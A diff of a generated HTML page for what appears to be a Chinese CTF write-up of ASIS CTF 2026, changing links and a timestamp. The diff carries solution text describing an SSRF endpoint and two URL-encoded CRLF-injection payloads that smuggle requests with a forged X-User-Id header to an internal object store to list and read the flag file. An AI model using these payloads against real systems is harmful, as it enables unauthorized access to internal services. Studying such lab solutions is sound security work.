@@ -178,7 +178,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://maz-dev834.github.io/2026/02/27/ASISCTF%202026%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">
+    <link itemprop="mainEntityOfPage" href="https://maz-dev834.github.io/2026/02/27/ASISCTF2026/ASISCTF%202026%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://github.com/maz-dev834.png">
@@ -196,7 +196,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2026/02/27/ASISCTF%202026%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">未命名</a>
+          <a href="/2026/02/27/ASISCTF2026/ASISCTF%202026%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">未命名</a>
         </h2>
 
         <div class="post-meta-container">
@@ -207,7 +207,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2026-02-27 16:32:50" itemprop="dateCreated datePublished" datetime="2026-02-27T16:32:50+08:00">2026-02-27</time>
+      <time title="创建时间：2026-02-27 20:56:21" itemprop="dateCreated datePublished" datetime="2026-02-27T20:56:21+08:00">2026-02-27</time>
     </span>
 
   
@@ -263,7 +263,7 @@ def object_ops(bucket, object_name, is_admin&#x3D;False):
       proxy_set_header Host $host;
     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <ol start="3">
-<li><p>flag 文件名是 md5(内容) 派生<br>objectstore 启动时将 flag.txt 重命名为 flag-<md5>.txt。</p>
+<li><p>flag 文件名是 md5(内容) 派生<br>objectstore 启动时将 flag.txt 重命名为 flag-<md5>.txt。</md5></p>
 </li>
 <li><p>存在一个SSRF点 &#x2F;api&#x2F;compose</p>
 </li>
@@ -353,8 +353,8 @@ X-User-Id: 999\r\n
 <p>URL 编码版本：</p>
 <pre class="line-numbers language-none"><code class="language-none">http+post:&#x2F;&#x2F;objectstore:8082&#x2F;FLAG?list&#x3D;1%20HTTP&#x2F;1.1%0d%0aHost:%20objectstore:8082%0d%0aX-User-Id:%20999%0d%0a%0d%0aGET%20&#x2F;FLAG?list&#x3D;1%20HTTP&#x2F;1.1%0d%0aHost:%20objectstore:8082%0d%0aX-User-Id:%20999%0d%0a%0d%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>返回：<br>{“bucket”:”FLAG”,”objects”:[“flag-<md5>.txt”]}</p>
-<p>Payload 2：读取文件<br>把 <md5> 替换成真实文件名：</p>
+<p>返回：<br>{“bucket”:”FLAG”,”objects”:[“flag-<md5>.txt”]}</md5></p>
+<p>Payload 2：读取文件<br>把 <md5> 替换成真实文件名：</md5></p>
 <pre class="line-numbers language-none"><code class="language-none">[http+post:&#x2F;&#x2F;objectstore:8082&#x2F;FLAG?list&#x3D;1%20HTTP&#x2F;1.1%0d%0aHost:%20objectstore:8082%0d%0aX-User-Id:%20999%0d%0a%0d%0aGET%20&#x2F;FLAG&#x2F;flag-&lt;md5&gt;.txt%20HTTP&#x2F;1.1%0d](http+post:&#x2F;&#x2F;objectstore:8082&#x2F;FLAG?list&#x3D;1%20HTTP&#x2F;1.1%0d%0aHost:%20objectstore:8082%0d%0aX-User-Id:%20999%0d%0a%0d%0aGET%20&#x2F;FLAG&#x2F;flag-&lt;md5&gt;.txt%20HTTP&#x2F;1.1%0d%0aHost:%20objectstore:8082%0d%0aX-User-Id:%20999%0d%0a%0d%0a)
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
